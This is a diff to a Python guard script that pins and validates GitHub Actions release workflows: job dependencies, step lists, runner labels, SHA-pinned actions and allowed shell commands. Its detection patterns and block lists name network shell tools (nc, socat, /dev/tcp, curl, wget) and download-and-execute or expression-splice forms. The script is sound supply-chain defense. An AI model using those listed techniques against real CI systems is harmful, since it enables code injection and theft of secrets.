@@ -50,7 +50,8 @@ each unit is and WHAT is substituted into it:
     ``target``/``os``/``artifact`` (+ ``nfpm_arch``) and whose values are
     unquoted literals matching a strict pattern (no expression, quote, space or
     shell metacharacter: they are substituted into the pinned build and assert
-    text before bash runs). The target set itself is pinned (``RELEASE_TARGETS``):
+    text before bash runs); an ``os`` value is exactly one of ``HOSTED_RUNNERS``
+    (Round 6: no ``self-hosted``). The target set itself is pinned (``RELEASE_TARGETS``):
     a legitimate matrix change updates that constant in the same commit. This
     pin is deliberate: an exact skeleton is cheaper to keep correct than an
     open-ended list of job keys that can skip, redirect or neutralise the
@@ -151,6 +152,8 @@ from __future__ import annotations
 
 import argparse
 import ast
+import fnmatch
+import json
 import os
 import re
 import shutil
@@ -159,7 +162,7 @@ import sys
 import tempfile
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
-from typing import Callable, Dict, Iterator, List, Optional, Tuple, Union
+from typing import Callable, Dict, Iterable, Iterator, List, Optional, Tuple, Union
 
 HERE = Path(__file__).resolve().parent
 
@@ -253,6 +256,8 @@ USES_CONSTANTS = {
     IMAGE_BUILD_USES: "IMAGE_BUILD_USES",
     ATTEST_USES: "ATTEST_USES",
 }
+# #8030: the action each constant pins, so every `uses:` of that action is compared to it.
+USES_BY_ACTION = {const.split("@", 1)[0]: const for const in USES_CONSTANTS}
 DOCKER_JOB: Dict[str, Spec] = {
     "name": "Docker (GHCR)",
     "needs": Flow("preflight, qualify, supply-chain"),
@@ -308,6 +313,23 @@ RELEASE_JOB_PERMISSIONS: Dict[str, Optional[Dict[str, Spec]]] = {
     "docker": dict(DOCKER_JOB["permissions"]),  # type: ignore[arg-type]
     "copr": dict(_READ_ATTEST),
 }
+# Every job's `needs:` edges, pinned (#6289): a publish job that dropped its
+# supply-chain / release gate would run before (or without) it. preflight is the
+# root and carries no `needs:`; docker reuses its whole-job pin.
+_PQS = Flow("preflight, qualify, supply-chain")
+_PQR = Flow("preflight, qualify, release")
+RELEASE_JOB_NEEDS: Dict[str, Spec] = {
+    "qualify": "preflight",
+    "supply-chain": Flow("preflight, qualify"),
+    "release": _PQS,
+    "sbom": _PQS,
+    "mobile-ios": _PQS,
+    "mobile-android": _PQS,
+    "crates-io": _PQR,
+    "homebrew": _PQR,
+    "docker": DOCKER_JOB["needs"],
+    "copr": _PQR,
+}
 # The only secrets release.yml may read: a new credential (a registry token in
 # another job) is refused until it is added here on purpose.
 RELEASE_SECRETS = ("GITHUB_TOKEN", "CARGO_REGISTRY_TOKEN", "HOMEBREW_TAP_TOKEN", "COPR_CONFIG")
@@ -333,6 +355,76 @@ SHAPE_JOB: Dict[str, Spec] = {
     "runs-on": "ubuntu-latest",
     "timeout-minutes": "60",
 }
+
+
+class Unit(str):
+    """A SHAPE_STEPS slot filled by a statement-list unit (SHAPE_BUILD / SHAPE_PROOF)."""
+
+
+# #6290: the release-shape job's ordered step list is pinned WHOLE. The build and
+# proof slots are the statement-list units; every other step is compared key by
+# key, so no step carries an `if:`, `continue-on-error:` or `timeout-minutes:` the
+# list does not pin (only the cleanup step runs `if: always()`), and none can be
+# added, dropped or reordered.
+SHAPE_STEPS: List[Spec] = [
+    {"uses": CHECKOUT_USES, "with": {"persist-credentials": "false"}},
+    {"name": "Install Rust 1.98.0 (matches rust-toolchain.toml pin)", "uses": "dtolnay/rust-toolchain@f8be11a05b1d4f3fcebe6410cc16743212b999b0"},
+    {"uses": "Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6"},
+    {"name": "Release feature declaration guard", "run": "python3 scripts/check_release_features.py"},
+    Unit("build"),
+    {"name": "No OpenSSL / libpq / native-tls in the shipped dependency graph", "shell": "bash",
+     "run": Block((
+         'set -euo pipefail',
+         'FEATURES="$(bash scripts/release-features.sh)"',
+         'test -n "$FEATURES"',
+         'tree="$(cargo tree --locked -e normal --target all --features "$FEATURES")"',
+         'if printf \'%s\\n\' "$tree" | grep -E \'(^|[^a-z-])(openssl-sys|native-tls|openssl |libpq)\'; then',
+         '  echo "::error::the release feature set pulls a native TLS / libpq dependency (#4480 requires pure-Rust rustls)"',
+         '  exit 1',
+         'fi',
+         'echo "no openssl-sys / native-tls / libpq in the release dependency graph"',
+     ))},
+    {"name": "Start a TLS PostgreSQL service (throwaway CA, hostssl-only)", "shell": "bash",
+     "run": Block((
+         'set -euo pipefail',
+         'd="$RUNNER_TEMP/pgtls"',
+         'mkdir -p "$d"',
+         'cd "$d"',
+         'openssl req -x509 -newkey rsa:2048 -nodes -days 1 -subj "/CN=release-shape-ca" -keyout ca.key -out ca.crt',
+         'openssl req -newkey rsa:2048 -nodes -subj "/CN=127.0.0.1" -keyout server.key -out server.csr',
+         "printf 'subjectAltName=IP:127.0.0.1,DNS:localhost\\n' > san.ext",
+         'openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -days 1 -extfile san.ext -out server.crt',
+         '# hostssl ONLY on TCP: a plaintext login cannot succeed, so a green',
+         '# round trip proves the session was TLS.',
+         "printf 'local all all trust\\nhostssl all all all scram-sha-256\\n' > pg_hba.conf",
+         'sudo chown 999:999 server.key server.crt pg_hba.conf',
+         'sudo chmod 600 server.key',
+         'pw="$(openssl rand -hex 16)"',
+         'echo "::add-mask::$pw"',
+         'echo "PGTLS_DIR=$d" >> "$GITHUB_ENV"',
+         'echo "PGTLS_PW=$pw" >> "$GITHUB_ENV"',
+         '# Image: pgvector/pgvector 0.8.7-pg18 (canonical PostgreSQL 18.6 + pgvector 0.8.7',
+         '# stack of the repo SSOT), pinned by digest; no Apache AGE in this image.',
+         'docker run -d --name release-shape-pg -p 127.0.0.1:55432:5432 -e POSTGRES_PASSWORD="$pw" -e POSTGRES_DB=proof -v "$d:/certs:ro" pgvector/pgvector@sha256:2358fcba361ed2233a5ed81b5fe4ca779ccb304120ce531a3bf51c0ed7e2bc11 -c ssl=on -c ssl_cert_file=/certs/server.crt -c ssl_key_file=/certs/server.key -c hba_file=/certs/pg_hba.conf',
+         'for _ in $(seq 1 60); do',
+         '  if docker exec release-shape-pg pg_isready -U postgres -d proof >/dev/null 2>&1; then',
+         '    ready=1; break',
+         '  fi',
+         '  sleep 2',
+         'done',
+         'if [ "${ready:-0}" != 1 ]; then',
+         '  docker logs release-shape-pg || true',
+         '  echo "::error::the TLS PostgreSQL service did not become ready (the proof must not pass vacuously)"',
+         '  exit 1',
+         'fi',
+         "docker exec release-shape-pg psql -U postgres -d proof -v ON_ERROR_STOP=1 -c 'CREATE EXTENSION IF NOT EXISTS vector;'",
+     ))},
+    Unit("proof"),
+    {"name": "Stop the PostgreSQL service", "if": "always()", "shell": "bash",
+     "run": "docker rm -f release-shape-pg >/dev/null 2>&1 || true"},
+]
+SHAPE_STEP_ROLES = ("checkout", "toolchain", "build cache", "feature declaration guard", "release-shaped build",
+                    "native TLS check", "TLS PostgreSQL service", "PG proof", "PostgreSQL cleanup")
 # #4480 ruled the release-shape job ADVISORY until its first green run on main; #4720
 # tracks the flip to required. While True the job must carry exactly the plain
 # `continue-on-error: true`; the #4720 fix sets this to False in the same commit
@@ -362,9 +454,14 @@ RELEASE_TARGETS = (
     "aarch64-apple-darwin",
 )
 MATRIX_REQUIRED = ("target", "os", "artifact")
+# Round 6 (security 3 and 4): a runner is one GitHub-hosted label. The values release.yml uses (ubuntu-latest,
+# ubuntu-24.04-arm, macos-15-intel, macos-latest) plus the pinned siblings; `self-hosted` and any expression are refused.
+HOSTED_RUNNERS = ("ubuntu-latest", "ubuntu-22.04", "ubuntu-24.04", "ubuntu-24.04-arm", "macos-latest", "macos-14",
+                  "macos-15", "macos-15-intel", "windows-latest")
+
 MATRIX_VALUE_RE = {
     "target": re.compile(r"[a-z0-9_]+(?:-[a-z0-9_]+){2,3}"),
-    "os": re.compile(r"[a-z0-9]+(?:[.-][a-z0-9]+)*"),
+    "os": re.compile("|".join(re.escape(r) for r in HOSTED_RUNNERS)),
     "artifact": re.compile(r"ai-memory"),
     "nfpm_arch": re.compile(r"[a-z0-9_]+"),
 }
@@ -518,6 +615,9 @@ def first_diff(got: Tuple[str, ...], want: Tuple[str, ...]) -> str:
 class Report:
     def __init__(self) -> None:
         self.errors: List[str] = []
+        self.root: Optional[Path] = None  # the tree being checked (local actions are read from it)
+        self.walked: set = set()  # resolved local-action directories already walked (Round 6, R4-3)
+        self.heights: Dict[Path, int] = {}  # Round 7 (N6): the height of the chain below each walked local action
 
     def bad(self, msg: str) -> None:
         self.errors.append(msg)
@@ -1050,6 +1150,20 @@ def check_docker_job(jobs: Node, rep: Report) -> None:
             rep.bad(msg)
 
 
+def check_job_needs(name: str, job: Node, rep: Report) -> None:
+    """#6289: the job's `needs:` is exactly RELEASE_JOB_NEEDS[name]; the root job has none."""
+    needs = RELEASE_JOB_NEEDS.get(name)
+    if needs is None:
+        if job.get("needs") is not None:
+            rep.bad(pin_message("release.yml", f"`jobs.{name}` carries a `needs:` and is pinned to have none (#6289)",
+                                "RELEASE_JOB_NEEDS"))
+        return
+    why = pin_problem(job.get("needs"), needs, f"jobs.{name}.needs")
+    if why:
+        rep.bad(pin_message("release.yml", why + " (a dropped edge lets the job run before its gate, #6289)",
+                            "RELEASE_JOB_NEEDS"))
+
+
 def check_release_permissions(doc: Node, jobs: Node, rep: Report) -> None:
     """The job set and every job's `permissions:` are pinned; `packages: write`
     is the docker job's alone (#4719 SR-8)."""
@@ -1067,6 +1181,7 @@ def check_release_permissions(doc: Node, jobs: Node, rep: Report) -> None:
             continue
         if job.get("uses") is not None:
             rep.bad(f"release.yml: `jobs.{name}` calls a reusable workflow (`uses:`), which the guard cannot read")
+        check_job_needs(name, job, rep)
         perms = job.get("permissions")
         if want is None:
             if perms is not None:
@@ -1118,6 +1233,2720 @@ def check_run_continuations(doc: Node, label: str, rep: Report) -> None:
                         f"guard refuses continuations in run text): {text.strip()[:70]}")
 
 
+# #6904: a `uses:` names an action by a full 40-hex commit sha (a tag, a branch
+# or a short ref can be re-pointed); a local `./` action and a docker image by
+# sha256 digest are the only other forms.
+USES_PINNED_RE = re.compile(r"\./[A-Za-z0-9_./-]+|docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]{64}"
+                            r"|[A-Za-z0-9][A-Za-z0-9_.-]*/[A-Za-z0-9_./-]+@[0-9a-f]{40}")
+
+
+# Round 5 (F2): a container or service image is pinned by digest, as a `docker://` use is.
+IMAGE_DIGEST_RE = re.compile(r"[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]{64}")
+DOCKER_USES_RE = re.compile(r"docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]{64}")
+# Round 5 (F4): a `run:` never downloads and executes, and never splices an attacker-influenced
+# expression into the script text (it belongs in `env:` and is quoted in the script).
+EXPR_RE = re.compile(r"\$\{\{(.*?)\}\}", re.S)
+# Round 6 (3-agent vote 6def5ab6, option B, 3-0): the denylist regexes of round 5 are gone (two rounds of
+# splice and download-execute forms slipped past them). A `${{ }}` expression in `run:` text is allowed only as
+# a bare `matrix.<key>`, `secrets.<NAME>` or `steps.<id>.outputs.<name>` path, and a step that fetches may run
+# only the commands of FETCH_ALLOWED; everything else is refused, so a new form fails closed.
+EXPR_PATH_RE = re.compile(r"[A-Za-z_][A-Za-z0-9_-]*(?:\.[A-Za-z_][A-Za-z0-9_-]*)*")
+SHA_USES_RE = re.compile(r"[^@\s]+@[0-9a-f]{40}")
+TAINT_ENV_RE = re.compile(r"\$\{?GITHUB_(?:HEAD_REF|REF_NAME|REF|BASE_REF|EVENT_PATH|ACTOR|TRIGGERING_ACTOR)(?![A-Za-z0-9_])")
+# Case-folded and matched anywhere in a word (also inside `sh -c '...'`): a false positive only makes a step
+# subject to the allow-list, never exempt from it.
+FETCH_WORD_RE = re.compile(
+    r"(?<![\w.-])(?:curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|Start-BitsTransfer|DownloadFile|git\s+clone|"
+    r"urllib\w*|http\.client|httplib|requests|aria2c|axel|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|ftp)(?![\w-])", re.I)
+URL_RE = re.compile(r"[A-Za-z][A-Za-z0-9+.-]*://")
+# `docker run` options that take a value, so the image is the first token that is not an option or a value.
+DOCKER_VALUE_OPTS = frozenset((
+    "-e", "--env", "-v", "--volume", "-p", "--publish", "--name", "--network", "--net", "-w", "--workdir", "-u", "--user",
+    "--entrypoint", "--env-file", "-l", "--label", "--platform", "--restart", "-h", "--hostname", "--add-host", "--mount",
+    "--cap-add", "--cap-drop", "--device", "--dns", "--memory", "-m", "--cpus", "--pull", "--log-driver", "--security-opt",
+    "--tmpfs", "--ulimit", "--shm-size", "--health-cmd", "--group-add", "--ip", "--cgroup-parent", "--stop-signal"))
+# Round 8 (C4): `docker run` options that take no value. An option in neither set is refused, because an unknown valued
+# option would make the guard read its value as the image.
+DOCKER_FLAG_OPTS = frozenset((
+    "-d", "--detach", "-i", "--interactive", "-t", "--tty", "-it", "-dit", "-di", "--rm", "--init", "--privileged",
+    "--read-only", "-P", "--publish-all", "--no-healthcheck", "--sig-proxy=false", "-q", "--quiet"))
+# Round 8 (S8, 3-agent vote 6def5ab6 extended to every `run:`): the command words a `run:` text may use. A word that
+# is not here (and is not a function the text defines) is a problem, so a downloader (pip, npm, go, aria2c, nc, ...) is
+# refused by not being listed and no pattern has to name it. The tuple is sorted (a test pins that). A tool that can
+# fetch or run code is further held to its own policy in command_problem.
+RUN_ALLOWED = (
+    "[", "[[", "apt-get", "awk", "bash", "cargo", "cat", "cbindgen", "cd", "chmod", "chown", "command", "copr-cli", "cp",
+    "curl", "cut", "declare", "docker", "echo", "export", "gh", "git", "grep", "head", "lipo", "ls", "mkdir", "mv", "nfpm",
+    "openssl", "pipx", "printf", "python3", "rm", "rpm", "rpmbuild", "sed", "seq", "sha256sum", "shasum", "sleep", "source",
+    "sudo", "tail", "tar", "test", "timeout", "tr", "unzip", "wget", "xargs", "xcodebuild")
+RUN_WRAPPERS = ("command", "sudo", "timeout", "xargs")  # run the command that follows; that command is held to the list
+RUN_GIT = ("add", "branch", "checkout", "commit", "config", "diff", "fetch", "log", "merge-base", "push", "rev-list",
+           "rev-parse", "show", "status", "tag")
+RUN_CARGO = ("build", "check", "clippy", "cyclonedx", "doc", "fetch", "fmt", "install", "metadata", "package", "publish",
+             "test", "tree")
+RUN_CARGO_CRATES = ("cargo-cyclonedx", "cbindgen")  # `cargo install` of these two, with --locked and a pinned --version
+RUN_DOCKER = ("exec", "inspect", "kill", "logs", "ps", "rm", "stop")  # run, create and pull need a digest or a local image
+RUN_OPENSSL = ("dgst", "ecparam", "genpkey", "genrsa", "pkey", "rand", "req", "verify", "version", "x509")
+RUN_PIPX = frozenset((("ensurepath",), ("install", "copr-cli"), ("inject", "copr-cli", "rich")))
+RUN_APT_PKGS = ("pipx", "rpm")
+RUN_URL_TOOLS = ("cargo", "copr-cli", "docker", "git", "nfpm", "pipx", "rpm", "rpmbuild")  # given a URL, they fetch it
+RUN_SCRIPT_RE = re.compile(r"[A-Za-z0-9_][A-Za-z0-9_./-]*")
+RUN_PY_RE = re.compile(r"[A-Za-z0-9_][A-Za-z0-9_./-]*\.py")
+RUN_SH_FLAGS_RE = re.compile(r"[-+][euxBE]+")
+RUN_PY_FLAGS_RE = re.compile(r"-[IuBsSE]+")
+RUN_DURATION_RE = re.compile(r"[0-9]+[smhd]?")
+FETCH_ALLOWED = ("curl", "wget", "sha256sum", "shasum", "tar", "unzip", "mkdir", "mv", "cp", "cd", "echo", "test", "[",
+                 "ls", "chmod")
+FETCH_FILE_RE = re.compile(r"GITHUB_(?:ENV|PATH)(?![A-Za-z0-9_])")  # a fetch step never edits the next steps' env or PATH
+# Round 7 (F3): a command that consumes a fetched file needs a checksum check first; these check one.
+FETCH_CONSUMERS = ("tar", "unzip", "mv", "cp", "chmod")
+FETCH_VERIFIERS = ("sha256sum", "shasum")
+# Round 7 (F5): a network connection opened by the shell itself, with no command to list.
+DEV_NET_RE = re.compile(r"/dev/(?:tcp|udp)/")
+EXEC_FD_RE = re.compile(r"\bexec\s+(?:[0-9]+|\{[A-Za-z_]\w*\})?<>")
+# Round 7 (F3): a path in a bin directory (a downloaded file there would run under an allowed command name).
+BIN_DIR_RE = re.compile(r"(?:^|[/=:~])(?:\.local/)?s?bin(?:/|$)")
+# Round 7 (N3): the options of curl and wget a fetch step may use; every other option is refused.
+CURL_SHORT_RE = re.compile(r"-(?:[fsSLv]+o?|o)")
+CURL_LONG_FLAGS = frozenset(("--fail", "--silent", "--show-error", "--location", "--fail-with-body", "--create-dirs", "--verbose"))
+CURL_LONG_VALUE = frozenset(("--output", "--retry", "--retry-delay", "--retry-max-time", "--connect-timeout", "--max-time", "--proto"))
+WGET_SHORT_FLAGS = frozenset(("-q", "-v", "-nv", "-c", "-nc", "-N"))
+WGET_SHORT_VALUE_RE = re.compile(r"-[qvcN]*[OtTP]")
+WGET_SHORT_ATTACHED_RE = re.compile(r"-[qvcN]*O(.+)")
+WGET_LONG_FLAGS = frozenset(("--quiet", "--no-verbose", "--continue", "--no-clobber", "--https-only", "--retry-connrefused"))
+WGET_LONG_VALUE = frozenset(("--output-document", "--tries", "--timeout", "--directory-prefix", "--max-redirect"))
+TAR_FLAGS_RE = re.compile(r"-?[xzfvCjJtpmkO]+")  # no -I / --use-compress-program / --to-command / --checkpoint-action
+TAR_LONG_RE = re.compile(r"--(?:strip-components=[0-9]+|no-same-owner|no-same-permissions)")
+RUNS_ON_MATRIX_RE = re.compile(r"\$\{\{\s*matrix\.os\s*\}\}")
+# Round 6 (security 5): triggers no guarded workflow may have, and the canonical JSON of each `on:` block.
+ON_FORBIDDEN = ("workflow_call", "pull_request_target", "repository_dispatch")
+ON_PINS: Dict[str, str] = {
+    'release.yml':
+        '{"workflow_dispatch":{"inputs":{"dry_run":{"default":"true","type":"boolean"},"tag":{"required":"true"}}}}',
+    'c8-precheck.yml':
+        '{"merge_group":{"types":"checks_requested"},"pull_request":{"branches":"main, develop, \\"release/**\\", \\"rehearsal/**\\", \\"chain/**\\""},"push":{"branches":"main, develop, \\"release/**\\""}}',
+    'publish-ci-image.yml':
+        '{"push":{"branches":"\\"release/**\\"","paths":[".github/Dockerfile.ci",".github/workflows/publish-ci-image.yml","deploy/docker-1461/provision/lib.sh"]},"workflow_dispatch":null}',
+}
+
+
+class RunCtx:
+    """What a `run:` text may name: the matrix keys of its job and the ids of its same-job steps that are safe
+    (a `run:` step; Round 8, S3, vote 6def5ab6 option B: never a `uses:` step) and not tainted. Round 7 adds the shell the steps run
+    under, whether the job runs on Windows, the image tags an earlier step built locally and the names a fetch step
+    wrote (a later step that names one must verify it)."""
+
+    def __init__(self, matrix: Iterable[str] = (), safe: Iterable[str] = (), tainted: Iterable[str] = (),
+                 default_shell: str = "", windows: bool = False, local_images: Iterable[str] = (),
+                 uses_ids: Iterable[str] = (), matrix_values: Optional[Dict[str, List[str]]] = None) -> None:
+        self.matrix = frozenset(matrix)
+        self.safe = frozenset(safe)
+        self.tainted = frozenset(tainted)
+        self.default_shell = default_shell
+        self.windows = windows
+        self.local_images = frozenset(local_images)
+        self.uses_ids = frozenset(uses_ids)  # Round 8 (S3): ids of `uses:` steps, whose outputs run text never names
+        self.matrix_values: Dict[str, List[str]] = dict(matrix_values or {})  # Round 8 (S4): literal values per key
+        self.fetched: set = set()
+        self.fetch_dirs: set = set()  # Round 9 (sec F3): the directories a step wrote a download into
+        self.made: set = set()  # Round 9 (F6): variables an earlier step wrote to GITHUB_ENV from a computed value
+
+
+def expr_allowed(expr: str, ctx: RunCtx) -> bool:
+    """True only for a bare property path rooted at matrix.<key>, secrets.<NAME> or steps.<id>.outputs.<name>."""
+    path = expr.strip()
+    if not EXPR_PATH_RE.fullmatch(path):
+        return False
+    parts = path.split(".")
+    if parts[0] == "matrix":
+        return len(parts) == 2 and parts[1] in ctx.matrix
+    if parts[0] == "secrets":
+        return len(parts) == 2
+    if parts[0] == "steps":
+        return len(parts) == 4 and parts[2] == "outputs" and parts[1] in ctx.safe and parts[1] not in ctx.tainted
+    return False
+
+
+def run_text(run: Node) -> Optional[str]:
+    if run.kind == "block" and isinstance(run.value, list):
+        return "\n".join(run.value)
+    return run.text() if run.kind == "scalar" else None
+
+
+def node_texts(node: Node) -> List[str]:
+    """The text of every scalar and block scalar at or under ``node``."""
+    texts: List[str] = []
+    for _path, sub in walk(node):
+        if sub.kind == "scalar":
+            texts.append(sub.text())
+        elif sub.kind == "block" and isinstance(sub.value, list):
+            texts.append("\n".join(sub.value))
+    return texts
+
+
+def node_exprs(node: Node) -> List[str]:
+    return [m.group(1) for t in node_texts(node) for m in EXPR_RE.finditer(t)]
+
+
+def step_exprs(step: Node) -> List[str]:
+    """Every `${{ }}` body in a step's run text, env values and (Round 7, F1) `with:` values."""
+    texts: List[str] = []
+    run = step.get("run")
+    body = run_text(run) if run is not None else None
+    if body is not None:
+        texts.append(body)
+    for key in ("env", "with"):
+        sub = step.get(key)
+        if sub is not None:
+            texts.extend(node_texts(sub))
+    return [m.group(1) for t in texts for m in EXPR_RE.finditer(t)]
+
+
+def written_files(body: str) -> List[str]:
+    """Round 7 (N5, F1): the redirect targets of a script other than GITHUB_OUTPUT and the std streams."""
+    try:
+        targets = ShellScan(EXPR_RE.sub("$__GHX__", body)).targets
+    except ShellError:
+        return ["\0unreadable"]
+    return [t for t in targets if t and not t.isdigit() and t != "-" and "GITHUB_OUTPUT" not in t and not t.startswith("/dev/")]
+
+
+def local_image_tags(nodes: List[Node]) -> List[str]:
+    """Tags a sha-pinned docker/build-push-action step loads into the local daemon (`load: true`)."""
+    tags: List[str] = []
+    for step in nodes:
+        uses = step.get("uses") if step.kind == "map" else None
+        if uses is None or uses.kind != "scalar":  # an unpinned use is refused on its own, so its tags are listed too
+            continue
+        if not uses.text().strip().lower().startswith("docker/build-push-action@"):
+            continue
+        with_ = step.get("with")
+        load, tag = (with_.get("load"), with_.get("tags")) if with_ is not None else (None, None)
+        if load is None or load.text().strip() != "true" or tag is None:
+            continue
+        for text in node_texts(tag):
+            tags.extend(t.strip() for t in re.split(r"[\s,]+", text) if t.strip())
+    return tags
+
+
+def run_context(steps: Optional[Node], matrix: Iterable[str], envs: Iterable[Optional[Node]] = (),
+                default_shell: str = "", windows: bool = False,
+                matrix_values: Optional[Dict[str, List[str]]] = None) -> RunCtx:
+    """The safe and tainted step ids of one job (or composite action). A step that writes `$GITHUB_OUTPUT` (or a
+    legacy `::set-output`) while it references a root outside the allow-list (in its env or text) is tainted, and so
+    are the steps that read it. Round 7 (N5, F1): a job or workflow `env` with a root outside the allow-list taints
+    every writer of the job; a `uses:` step with such a root in its `with:` or `env:` has tainted outputs; and a
+    writer that follows a step with such a root which wrote GITHUB_ENV / GITHUB_PATH, or a file the writer names, is
+    tainted (a value relayed through the environment or a file)."""
+    nodes = steps.value if steps is not None and steps.kind == "seq" and isinstance(steps.value, list) else []
+    images = local_image_tags(nodes)
+    base = RunCtx(matrix)
+    env_dirty = any(not expr_allowed(e, base) for env in envs if env is not None for e in node_exprs(env))
+    safe: set = set()
+    uses_ids: set = set()
+    recs: List[Tuple[str, Node, str, bool]] = []
+    for step in nodes:
+        if step.kind != "map":
+            continue
+        ident = step.get("id")
+        sid = ident.text().strip() if ident is not None and ident.kind == "scalar" else ""
+        run, uses = step.get("run"), step.get("uses")
+        body = (run_text(run) or "") if run is not None else ""
+        writer = False
+        if run is not None:
+            writer = "GITHUB_OUTPUT" in body or "set-output" in body
+            if sid:
+                safe.add(sid)
+        elif uses is not None:
+            if sid:
+                uses_ids.add(sid)  # Round 8 (S3): an output of a `uses:` step is never safe in run text
+            writer = uses.kind == "scalar" and SHA_USES_RE.fullmatch(uses.text().strip()) is not None
+        recs.append((sid, step, body, writer))
+    tainted: set = set()
+    changed = True
+    while changed:
+        changed = False
+        ctx = RunCtx(matrix, safe, tainted)
+        relay, names = False, set()
+        for sid, step, body, writer in recs:
+            dirty = bool(TAINT_ENV_RE.search(body)) or not all(expr_allowed(e, ctx) for e in step_exprs(step))
+            if writer and sid and sid not in tainted and (
+                    env_dirty or dirty or relay or "\0unreadable" in names or any(n in body for n in names)):
+                tainted.add(sid)
+                changed = True
+            if dirty and body:
+                relay = relay or FETCH_FILE_RE.search(body) is not None
+                names.update(written_files(body))
+    return RunCtx(matrix, safe, tainted, default_shell, windows, images, uses_ids, matrix_values)
+
+
+def matrix_keys(job: Node) -> List[str]:
+    """The keys a `matrix.<key>` expression may name: the axes and the keys of the include entries."""
+    st = job.get("strategy")
+    matrix = st.get("matrix") if st is not None else None
+    keys: List[str] = []
+    if matrix is None or matrix.kind != "map" or not isinstance(matrix.value, dict):
+        return keys
+    for key, val in matrix.value.items():
+        if key == "include":
+            for entry in val.value if val.kind == "seq" and isinstance(val.value, list) else []:
+                keys.extend(entry.keys())
+        elif key != "exclude":
+            keys.append(key)
+    return keys
+
+
+def flow_items(text: str) -> List[str]:
+    """The items of a flow list `[a, 'b, c', "d"]` (a plain scalar is its own single item)."""
+    text = text.strip()
+    if not (text.startswith("[") and text.endswith("]")):
+        return [text.strip("'\"")] if text else []
+    items: List[str] = []
+    cur, quote = "", ""
+    for ch in text[1:-1] + ",":
+        if quote:
+            if ch == quote:
+                quote = ""
+            else:
+                cur += ch
+        elif ch in "'\"":
+            quote = ch
+        elif ch == ",":
+            if cur.strip():
+                items.append(cur.strip())
+            cur = ""
+        else:
+            cur += ch
+    return items
+
+
+def matrix_literals(job: Node) -> Dict[str, List[str]]:
+    """Round 8 (S4): every literal value of each matrix key (axis lists, flow lists, include entries)."""
+    st = job.get("strategy")
+    matrix = st.get("matrix") if st is not None and st.kind == "map" else None
+    out: Dict[str, List[str]] = {}
+    if matrix is None or matrix.kind != "map" or not isinstance(matrix.value, dict):
+        return out
+
+    def values(node: Node) -> List[str]:
+        if node.kind == "map":
+            return [MATRIX_COMPLEX]  # Round 9 (F8): a mapping value spliced whole is not a word
+        if node.kind == "seq" and isinstance(node.value, list):
+            got: List[str] = []
+            for n in node.value:
+                if n.kind != "scalar" or matrix_complex_text(n.text()):
+                    got.append(MATRIX_COMPLEX)
+                else:
+                    got.extend(flow_items(n.text()))
+            return got
+        if node.kind == "scalar":
+            return [MATRIX_COMPLEX] if matrix_complex_text(node.text()) else flow_items(node.text())
+        return []
+
+    for key, val in matrix.value.items():
+        if key == "include":
+            for entry in val.value if val.kind == "seq" and isinstance(val.value, list) else []:
+                if entry.kind == "map" and isinstance(entry.value, dict):
+                    for ekey, eval_ in entry.value.items():
+                        out.setdefault(ekey, []).extend(values(eval_))
+        elif key != "exclude":
+            out.setdefault(key, []).extend(values(val))
+    return out
+
+
+def matrix_os_values(job: Node) -> List[str]:
+    """Every `os` of a job's matrix (an axis list, a flow list or include entries)."""
+    st = job.get("strategy")
+    matrix = st.get("matrix") if st is not None else None
+    if matrix is None or matrix.kind != "map":
+        return []
+    out: List[str] = []
+    axis = matrix.get("os")
+    if axis is not None and axis.kind == "seq" and isinstance(axis.value, list):
+        out.extend(n.text().strip() for n in axis.value)
+    elif axis is not None and axis.kind == "scalar":
+        text = axis.text().strip()
+        inner = text[1:-1] if text.startswith("[") and text.endswith("]") else text
+        out.extend(p.strip().strip("'\"") for p in inner.split(","))
+    include = matrix.get("include")
+    for entry in include.value if include is not None and include.kind == "seq" and isinstance(include.value, list) else []:
+        val = entry.get("os")
+        out.append(val.text().strip() if val is not None and val.kind == "scalar" else "")
+    return out
+
+
+# ------------------------------------------------------- shell scanner --
+SHELL_CMD_KW = frozenset(("if", "then", "elif", "else", "while", "until", "do", "!", "{", "time"))
+SHELL_END_KW = frozenset(("fi", "done", "esac", "}"))
+SHELL_NOOP = frozenset(("set", "exit", ":", "true", "false", "break", "continue", "return"))
+SHELL_ASSIGN_RE = re.compile(r"([A-Za-z_][A-Za-z0-9_]*)\+?=")
+# Round 11 (sec r10 F3): the letters that follow the `@` of a parameter transformation. Bash 5.2 reads U u L Q E P A a K; any
+# other letter is refused too, because the scanner cannot know which a later bash re-evaluates.
+TRANSFORM_LETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+# Round 12 (code r11 F2): array-subscript text that holds a substitution: a `[` then, ANYWHERE in the rest of the word (no `]`
+# stop, so a nested subscript or a quoted `]` hides nothing), `$(`, a backtick or a `${` with an `@` operator.
+# decision: search the whole rest of the word after a `[` over stopping at the first `]` because bash re-evaluates the text of a
+# nested subscript and a quoted `]` ends the guard's reading at a different place than bash's.
+SUBSCRIPT_SUBST_RE = re.compile(r"\[.*(?:\$\(|`|\$\{[^}]*@[A-Za-z])", re.S)
+# Round 12 (code r11 F1): a here-document delimiter is a plain word, alone, in one whole quote pair, or after one backslash.
+HEREDOC_DELIM_RE = re.compile(r"\\[A-Za-z0-9_]+|'[A-Za-z0-9_]+'|\"[A-Za-z0-9_]+\"|[A-Za-z0-9_]+")
+HEREDOC_DELIM_END = " \t\n;&|()<>"
+# Round 12 (code r11 F3): the text a re-evaluating context may hold: blanks, `$name`, `${name}`, `$?` `$#` `$$` `$!`, numbers,
+# names and arithmetic operator characters (a quote, a backtick, a `$(`, a braced default and every other character is
+# not literal).
+ARITH_TOKEN_RE = re.compile(
+    r"\s+|\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)|\$[?#$!]"
+    r"|0[xX][0-9A-Fa-f]+|[0-9]+(?:#[0-9A-Za-z@_]+)?|([A-Za-z_][A-Za-z0-9_]*)|[-+*/%<>=!&|^~?:,()\[\]]")
